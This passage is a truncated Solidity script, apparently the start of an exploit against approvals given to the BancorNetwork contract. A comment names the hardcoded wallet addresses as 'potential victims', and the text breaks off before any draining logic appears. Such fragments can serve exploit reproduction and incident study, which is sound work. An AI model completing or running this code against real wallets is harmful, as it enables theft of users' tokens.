    address public constant BNT = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C;

    function run() public {
        // List of potential victims who might have approved BancorNetwork
        address[] memory victims = new address[](6);
        victims[0] = 0x55977304c14Eccd6996f924697169D63E213093a;
        victims[1] = 0xf05E96F90486664F622724649A06F45f6704Eb0d;
        victims[2] = 0x762970969c0357406412D3dE882985122b3a95CE;
        victims[3] = 0x12598d2fd8848f58D236701C905596221078B8B1;
